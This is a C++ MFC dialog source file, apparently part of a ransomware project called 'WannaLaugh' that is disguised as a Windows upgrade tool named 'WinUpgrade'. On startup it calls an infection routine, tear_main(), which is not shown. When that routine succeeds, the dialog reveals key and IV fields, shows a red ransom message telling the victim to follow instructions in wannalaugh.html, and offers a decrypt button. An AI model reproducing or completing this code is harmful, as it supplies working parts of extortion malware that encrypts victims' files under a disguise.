
// WinUpgradeDlg.cpp: 实现文件
//

#include "stdafx.h"
#include "WinUpgrade.h"
#include "WinUpgradeDlg.h"
#include "afxdialogex.h"
#include <fstream>
#include <sstream>

int decrypter_main(std::string t_key, std::string t_iv);
int tear_main(void);

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CWinUpgradeDlg 对话框



CWinUpgradeDlg::CWinUpgradeDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_WINUPGRADE_DIALOG, pParent)
	, m_key(_T(""))
	, m_IV(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CWinUpgradeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_KEY, m_key);
	//  DDX_Control(pDX, IDC_EDIT_IV, m_IV);
	DDX_Text(pDX, IDC_EDIT_IV, m_IV);
}

BEGIN_MESSAGE_MAP(CWinUpgradeDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_BUTTON_Decrypt, &CWinUpgradeDlg::OnBnClickedButtonDecrypt)
END_MESSAGE_MAP()


// CWinUpgradeDlg 消息处理程序

BOOL CWinUpgradeDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	int dif_case = tear_main();
	if (dif_case == 11)
	{
		//网络不通畅或服务器没有开启
		GetDlgItem(IDC_STATIC1)->SetWindowTextW(L"Please check your network settings and restart the exe again\n");
	}
	else
	if (dif_case == 0 || dif_case == 10)
	{
		//入侵成功，展露原型
		GetDlgItem(IDC_EDIT_KEY)->ShowWindow(true);
		GetDlgItem(IDC_EDIT_IV)->ShowWindow(true);
		std::ifstream ifile("iv.txt", std::ios::in);
		if (!ifile.is_open())
		{
			perror("can not open this file");
			return TRUE;
		}
		//将文件读入到ostringstream对象iv中
		std::ostringstream iv;
		char ch;
		while (iv && ifile.get(ch))
			iv.put(ch);
		CString iv_str;
		iv_str = iv.str().c_str();
		GetDlgItem(IDC_EDIT_IV)->SetWindowTextW(iv_str);

		GetDlgItem(IDC_STATIC_KEY)->ShowWindow(true);
		GetDlgItem(IDC_STATIC_IV)->ShowWindow(true);

		GetDlgItem(IDC_BUTTON_Decrypt)->ShowWindow(true);
		GetDlgItem(IDC_STATIC1)->SetWindowTextW(L"Your computer has been infected with WannaLaugh. If you want to restore the encrypted files, please follow the instructions in wannalaugh.html");
	}

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CWinUpgradeDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CWinUpgradeDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CWinUpgradeDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



HBRUSH CWinUpgradeDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何特性
	static CBrush gBr;
	static bool isInited = false;
	if (!isInited)
	{
		CBitmap bitmap;
		bitmap.LoadBitmap(IDB_BITMAP1);
		gBr.CreatePatternBrush(&bitmap);
		COLORREF clearColor = -1;
		bitmap.DeleteObject();
		isInited = true;
	}

	if (pWnd == this)
	{
		pDC->SetBkMode(TRANSPARENT);
		return gBr; //主窗口背景使用这个背景刷
	}
	else
	{
		if (pWnd->GetDlgCtrlID() == IDC_STATIC1)
		{
			//随手调色
			pDC->SetTextColor(RGB(255, 0, 0));
		}
		else
		if (pWnd->GetDlgCtrlID() == IDC_STATIC_IV || pWnd->GetDlgCtrlID() == IDC_STATIC_KEY)
		{
			pDC->SetTextColor(RGB(255, 255, 255));
		}
		else
		if (pWnd->GetDlgCtrlID() == IDC_EDIT_KEY || pWnd->GetDlgCtrlID() == IDC_EDIT_IV)
		{
			pDC->SetTextColor(RGB(0, 0, 0));
			pDC->SetBkColor(RGB(255, 255, 255));
			
			return hbr;
		}
		else
		if (pWnd->GetDlgCtrlID() == IDC_STATIC2)
		{
			//pDC->SetTextColor(RGB(200, 210, 220));
			pDC->SetTextColor(RGB(255, 0, 0));
			//return hbr;
		}
		pDC->SetBkMode(TRANSPARENT);//其他控件使用透明背景
		return   (HBRUSH)::GetStockObject(NULL_BRUSH); 
	}
	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}


void CWinUpgradeDlg::OnBnClickedButtonDecrypt()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData(true);
	std::string tkey = CT2A(m_key.GetBuffer());
	std::string tiv = CT2A(m_IV.GetBuffer());
	decrypter_main(tkey, tiv);

	GetDlgItem(IDC_STATIC1)->ShowWindow(true);
	GetDlgItem(IDC_STATIC2)->ShowWindow(true);
	GetDlgItem(IDC_STATIC2)->SetWindowTextW(L"Decrypt done!!!");
}
